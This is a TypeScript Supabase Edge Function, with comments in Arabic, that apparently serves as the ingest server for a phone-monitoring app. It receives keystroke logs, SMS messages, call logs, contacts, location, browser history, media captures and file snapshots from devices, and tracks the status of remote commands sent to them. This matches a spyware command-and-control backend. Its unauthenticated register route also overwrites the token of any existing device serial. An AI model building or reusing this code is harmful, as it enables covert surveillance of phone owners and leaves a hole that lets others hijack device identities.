/**
 * Supabase Edge Function: /ingest
 *
 * نقطة إدخال آمنة للبيانات من التطبيق.
 * تستخدم service_role_key (مخفي في الخادم) بدل anon_key (المكشوف في APK).
 *
 * التطبيق يرسل:
 *   POST /ingest/v1/{table}
 *   Header: x-device-token: <token>
 *   Body: { ... data ... }
 *
 * الـ Function:
 *   1. تستخرج device_serial من الـ token
 *   2. تتحقق من صحة الـ token في جدول device_tokens
 *   3. تحقن data في الجدول المطلوب باستخدام service_role
 *   4. ترجع النتيجة
 */

import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const ALLOWED_TABLES = new Set([
  "location_history",
  "device_state_snapshots",
  "installed_applications",
  "call_logs",
  "sms_messages",
  "contacts",
  "notification_logs",
  "app_usage_stats",
  "media_captures",
  "browser_history",
  "keystroke_logs",
  "file_system_snapshots",
]);

// جداول PATCH (تحديث) — كلها تحتاج command_id في الـ body
const PATCH_TABLES = new Set(["command_status"]);

serve(async (req) => {
  const start = Date.now();
  const path = new URL(req.url).pathname;
  const segments = path.split("/").filter(Boolean);

  const method = req.method;

  // POST /v1/register  — تسجيل جهاز جديد (لا يحتاج token)
  if (method === "POST" && segments.length === 2 && segments[0] === "v1" && segments[1] === "register") {
    return handleRegister(req);
  }

  // POST /v1/{table}  أو  PATCH /v1/{table}
  if ((method !== "POST" && method !== "PATCH") || segments.length !== 2 || segments[0] !== "v1") {
    return json(400, { error: "Usage: POST or PATCH /v1/{table}" });
  }

  const table = segments[1];
  if (!ALLOWED_TABLES.has(table)) {
    return json(403, { error: `Table '${table}' not allowed` });
  }

  // 1. التحقق من Device Token
  const token = req.headers.get("x-device-token");
  if (!token || token.length < 20) {
    return json(401, { error: "Missing or invalid x-device-token" });
  }

  const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

  const { data: device, error: deviceErr } = await supabase
    .from("devices")
    .select("device_serial, is_active")
    .eq("device_token", token)
    .single();

  if (deviceErr || !device) {
    return json(401, { error: "Invalid device token" });
  }

  if (!device.is_active) {
    return json(403, { error: "Device is deactivated" });
  }

  // 2. إضافة device_serial تلقائياً للبيانات
  const body = await req.json();
  if (!body || typeof body !== "object") {
    return json(400, { error: "Invalid JSON body" });
  }

  // التأكد من أن العميل لا يمرر device_serial بنفسه
  body.device_serial = device.device_serial;
  body.received_at = new Date().toISOString();

  // 3. إدخال أو تحديث حسب الطريقة
  let result;

  if (method === "PATCH" && PATCH_TABLES.has(table)) {
    if (table === "command_status") {
      const { command_id, status, executed_at } = body as any;
      if (!command_id || !status) {
        return json(400, { error: "command_id and status required for PATCH command_status" });
      }
      const { data, error } = await supabase
        .from("remote_commands")
        .update({ status, executed_at: executed_at ?? new Date().toISOString() })
        .eq("id", command_id)
        .eq("device_serial", device.device_serial)
        .select();
      result = data;
      if (error) {
        console.error(`[ingest] ${table} patch error:`, error.message);
        return json(500, { error: error.message });
      }
    } else {
      return json(400, { error: `PATCH not supported for '${table}'` });
    }
  } else {
    // POST — إدخال
    const { data, error } = await supabase
      .from(table)
      .insert(body)
      .select();
    result = data;
    if (error) {
      console.error(`[ingest] ${table} insert error:`, error.message);
      return json(500, { error: error.message });
    }
  }

  // 4. تحديث last_seen_at
  await supabase
    .from("devices")
    .update({ last_seen_at: new Date().toISOString() })
    .eq("device_serial", device.device_serial);

  const elapsed = Date.now() - start;
  console.log(`[ingest] ${table} OK ${elapsed}ms`);

  return json(200, { ok: true, table, elapsed_ms: elapsed });
});

// ================================================================
//  تسجيل جهاز جديد — لا يحتاج x-device-token
// ================================================================
async function handleRegister(req: Request): Promise<Response> {
  try {
    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

    const body = await req.json();
    if (!body || !body.device_serial) {
      return json(400, { error: "device_serial is required" });
    }

    // إنشاء token فريد
    const raw = crypto.getRandomValues(new Uint8Array(48));
    const b64 = btoa(String.fromCharCode(...raw)).replace(/[^a-zA-Z0-9]/g, "");
    const token = b64.substring(0, 64);

    // إدراج الجهاز
    const { error: insertErr } = await supabase
      .from("devices")
      .insert({
        device_serial: body.device_serial,
        device_token: token,
        device_name: body.device_name ?? null,
        manufacturer: body.manufacturer ?? null,
        model: body.model ?? null,
        os_version: body.os_version ?? null,
      });

    if (insertErr) {
      // إذا كان الجهاز موجود مسبقاً (duplicate serial)، نحدث الـ token
      if (insertErr.code === "23505") {
        const { error: updateErr } = await supabase
          .from("devices")
          .update({ device_token: token })
          .eq("device_serial", body.device_serial);

        if (updateErr) {
          return json(500, { error: updateErr.message });
        }
      } else {
        return json(500, { error: insertErr.message });
      }
    }

    // تسجيل في device_auth_log
    await supabase
      .from("device_auth_log")
      .insert({
        device_serial: body.device_serial,
        token_used: token,
        action: "token_rotated",
      });

    // تسجيل مفتاح التشفير إذا وجد
    if (body.public_key) {
      await supabase
        .from("device_encryption_keys")
        .upsert({
          device_serial: body.device_serial,
          public_key: body.public_key,
          key_algorithm: "AES-256-GCM",
        }, { onConflict: "device_serial" });
    }

    console.log(`[ingest] Device registered: ${body.device_serial}`);
    return json(200, { ok: true, device_token: token });
  } catch (err: any) {
    return json(500, { error: err.message ?? "Unknown error" });
  }
}

function json(status: number, body: Record<string, unknown>) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
